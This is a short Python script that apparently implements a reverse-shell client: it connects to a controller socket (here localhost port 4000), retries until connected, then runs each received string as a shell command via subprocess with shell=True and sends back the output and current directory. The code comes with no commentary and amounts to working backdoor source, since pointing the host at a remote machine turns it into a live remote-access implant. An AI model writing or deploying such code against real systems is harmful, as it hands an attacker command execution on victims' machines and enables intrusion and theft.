import socket
import os
import subprocess
from time import sleep


host = 'localhost'
port = 4000
connected = False
s = socket.socket()
while not connected:
    try:
        s.connect((host, port))
        print('connected')
        connected = True
    except:
        print('connection failed !!! retrying............')
        sleep(1)

while True:
    data = s.recv(4096)
    if(len(data.decode('utf-8'))>0 and data[:2].decode('utf-8') == 'cd'):
        os.chdir(data[3:].decode('utf-8'))
    if(len(data.decode('utf-8'))>0):
        cmd = subprocess.Popen(data.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read().decode('utf-8') + cmd.stderr.read().decode('utf-8')
        output_str = output_byte
        currentWD = os.getcwd()+"> "
        try:
            s.send((output_str + currentWD).encode('utf-8'))
        except:
            pass

    print(output_str)
